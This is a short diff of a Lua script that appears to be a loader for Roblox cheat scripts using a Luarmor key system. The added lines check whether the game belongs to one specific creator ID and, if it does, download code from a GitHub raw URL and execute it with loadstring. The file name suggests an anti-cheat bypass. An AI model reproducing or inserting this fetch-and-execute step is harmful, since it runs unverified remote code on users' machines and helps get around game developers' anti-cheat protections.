@@ -2,6 +2,11 @@ if not script_key then print("No Key Found") return end
 if not script_id then print("No ID Found") return end
 
 repeat task.wait() until game:IsLoaded()
+task.wait(0.5)
+
+if game.CreatorId == "35966884" then 
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/chillingcapi/Relay/refs/heads/main/Ac%20Bp"))()
+end
 task.wait(1)
 
 local luarmorURL = string.format("https://api.luarmor.net/files/v4/loaders/%s.lua", script_id)
